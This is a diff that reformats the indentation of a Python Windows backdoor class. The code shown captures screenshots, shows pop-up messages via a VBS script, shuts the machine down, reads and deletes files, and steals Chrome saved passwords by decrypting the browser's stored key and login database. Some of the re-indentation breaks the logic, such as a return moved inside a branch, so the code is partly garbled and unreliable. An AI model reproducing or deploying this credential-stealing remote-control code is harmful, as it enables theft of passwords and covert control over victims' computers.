@@ -21,12 +21,11 @@ import win32crypt
 import shutil
 
 class backdoor:
-
 	try:
-        	TMP = os.environ["TEMP"]
+		TMP = os.environ["TEMP"]
 		USER_PROFILE = os.environ["USERPROFILE"]
-    	except Exception:
-        	pass
+	except Exception:
+		pass
 
 	# start initial connection
 	def __init__ (self, ip, port):
@@ -85,11 +84,11 @@ class backdoor:
 	
 	# get the current user
 	def get_current_user(self):
-        	try:
-            		user = os.environ.get('USERNAME')           
-            		return "[+] Current user: " + str(user)
-        	except Exception as err:
-            		return "[-] Couldn't get the username: " + str(err)
+		try:
+			user = os.environ.get('USERNAME')
+			return "[+] Current user: " + str(user)
+		except Exception as err:
+			return "[-] Couldn't get the username: " + str(err)
 
 	# get system info
 	def get_system_info(self):
@@ -111,34 +110,34 @@ class backdoor:
 
 	# screenshot
 	def get_screenshot(self):
-        	try:
-            		current_time = datetime.datetime.now()
-            		screenshot = ImageGrab.grab()
+		try:
+			current_time = datetime.datetime.now()
+			screenshot = ImageGrab.grab()
+			
+			path = "{}/Screenshot{}{}{}.png".format(self.USER_PROFILE, current_time.year, current_time.month, current_time.day)
+			screenshot.save(path)
 
-            		path = "{}/Screenshot{}{}{}.png".format(self.USER_PROFILE, current_time.year, current_time.month, current_time.day)
-            		screenshot.save(path)
-
-            		data = self.read_file(path)
-            		self.delete_path(path)
+			data = self.read_file(path)
+			self.delete_path(path)
             
-            		return data
-        	except Exception as err:
-            		return "[-] Error getting screenshot: " + str(err)
+			return data
+		except Exception as err:
+			return "[-] Error getting screenshot: " + str(err)
 
 	# show message box popup
 	def show_message_box(self, message):
 		try:
 			str_script = os.path.join(self.TMP, "m.vbs")
-            		with open(str_script, "w") as objVBS:
-                		objVBS.write('Msgbox "' + message + '", vbOKOnly+vbInformation+vbSystemModal, "Message"'.decode('utf-8'))
+			with open(str_script, "w") as objVBS:
+				objVBS.write('Msgbox "' + message + '", vbOKOnly+vbInformation+vbSystemModal, "Message"'.decode('utf-8'))
             		
 			command = "cscript " + self.TMP + "/m.vbs "
 			
-            		subprocess.Popen(command , stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
+			subprocess.Popen(command , stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
 
 			return "[+] Message sent: " + str(message)
-        	except Exception as err:
-            		return "[-] Couldn't send the message: " + str(err)
+		except Exception as err:
+			return "[-] Couldn't send the message: " + str(err)
 
 	# lock computer
 	def lock_computer(self):
@@ -152,108 +151,108 @@ class backdoor:
 	def shutdown_computer(self, type):
 		try:
 			command = "shutdown " + type + " -f -t 30"
-            		subprocess.Popen(command.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
+			subprocess.Popen(command.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
             
-           		self.con.close()
-            		sys.exit(0)
+			self.con.close()
+			sys.exit(0)
 		except Exception as err:
 			return "[-] Falied to shutdown the computer: " + str(err)
 
 	# read file
 	def read_file(self, path):
-        	try:
-            		with open(path, "rb") as file:
-                		return base64.b64encode(file.read()).decode()
-        	except Exception as err:
-            		return "[-] (Client) Error reading: " + str(err)
+		try:
+			with open(path, "rb") as file:
+				return base64.b64encode(file.read()).decode()
+		except Exception as err:
+			return "[-] (Client) Error reading: " + str(err)
 
 	# delete file/path
 	def delete_path(self, path):
-        	try:
-            		if os.path.isdir(path):
-                		shutil.rmtree(path)
-            		elif os.path.isfile(path):
-                		os.remove(path)
+		try:
+			if os.path.isdir(path):
+				shutil.rmtree(path)
+			elif os.path.isfile(path):
+				os.remove(path)
 
-            		return "[+] Successfully deleted: " + path
-        	except Exception as err:
-            		return "[-] Error deleting: " + path + " | error: " + str(err)
+				return "[+] Successfully deleted: " + path
+		except Exception as err:
+			return "[-] Error deleting: " + path + " | error: " + str(err)
 
 	
 	# ============= Funcoes para pegar senhas do chrome ==============
 	
 	# fetch encrypted passwords
 	def fetch_encryption_key(self):
-        	local_computer_directory_path = os.path.join(
-       		os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
+		local_computer_directory_path = os.path.join(
+		os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
         
-        	with open(local_computer_directory_path, "r", encoding="utf-8") as f:
-            		local_state_data = f.read()
-            		local_state_data = json.loads(local_state_data)
+		with open(local_computer_directory_path, "r", encoding="utf-8") as f:
+			local_state_data = f.read()
+			local_state_data = json.loads(local_state_data)
     
-       		encryption_key = base64.b64decode(
+			encryption_key = base64.b64decode(
         	local_state_data["os_crypt"]["encrypted_key"])
-        	encryption_key = encryption_key[5:]
+			encryption_key = encryption_key[5:]
         
-        	return win32crypt.CryptUnprotectData(encryption_key, None, None, None, 0)[1]
+			return win32crypt.CryptUnprotectData(encryption_key, None, None, None, 0)[1]
 
 	# decrypt passwords
 	def decrypt_passwords(self, password, encryption_key):
-       		try:
-            		iv = password[3:15]
-            		password = password[15:]
+		try:
+			iv = password[3:15]
+			password = password[15:]
                         
-            		cipher = AES.new(encryption_key, AES.MODE_GCM, iv)            
-            		return cipher.decrypt(password)[:-16].decode()
-        	except:    
-            		try:
-                		return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
-            		except:
-                		return "No Passwords"
+			cipher = AES.new(encryption_key, AES.MODE_GCM, iv)            
+			return cipher.decrypt(password)[:-16].decode()
+		except:    
+			try:
+				return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
+			except:
+				return "No Passwords"
 
 	# get chrome passwords
 	def get_passwords(self):
 		final_ans = "====== Chrome Passwords ====="
     		
-        	key = self.fetch_encryption_key()
-        	db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data")
+		key = self.fetch_encryption_key()
+		db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data")
         
-        	filename = "ChromePasswords.db"
-        	shutil.copyfile(db_path, filename)        
-        	db = sqlite3.connect(filename)
-        	cursor = db.cursor()
+		filename = "ChromePasswords.db"
+		shutil.copyfile(db_path, filename)        
+		db = sqlite3.connect(filename)
+		cursor = db.cursor()
                 
-        	cursor.execute(
-            		"select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins "
-            		"order by date_last_used")
+		cursor.execute(
+			"select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins "
+			"order by date_last_used")
         
-        	for row in cursor.fetchall():
-            		main_url = row[0]
-            		login_url = row[1]
-            		username = row[2]
-            		password = self.decrypt_passwords(row[3], key)
+		for row in cursor.fetchall():
+			main_url = row[0]
+			login_url = row[1]
+			username = row[2]
+			password = self.decrypt_passwords(row[3], key)
             
-            		if username or password:
+			if username or password:
 				final_ans += "\n-----------------------------\n"                                   
-                		final_ans += "Main URL: " + main_url + "\n"
-                		final_ans += "Login URL: " + login_url + "\n"
-                		final_ans += "Username: " + username + "\n"
-                		final_ans += "Password: " + password + "\n"
+				final_ans += "Main URL: " + main_url + "\n"
+				final_ans += "Login URL: " + login_url + "\n"
+				final_ans += "Username: " + username + "\n"
+				final_ans += "Password: " + password + "\n"
 				final_ans += "-----------------------------\n"
-            		else:
-                		continue
+			else:
+				continue
 
-            	final_ans += "============================="
+		final_ans += "============================="
 
-        	cursor.close()
-        	db.close()
+		cursor.close()
+		db.close()
         
-        	try:            
-            		os.remove(filename)
-        	except:
-            		pass
+		try:            
+			os.remove(filename)
+		except:
+			pass
 
-        	return final_ans
+		return final_ans
 
 
 	# loop shell function
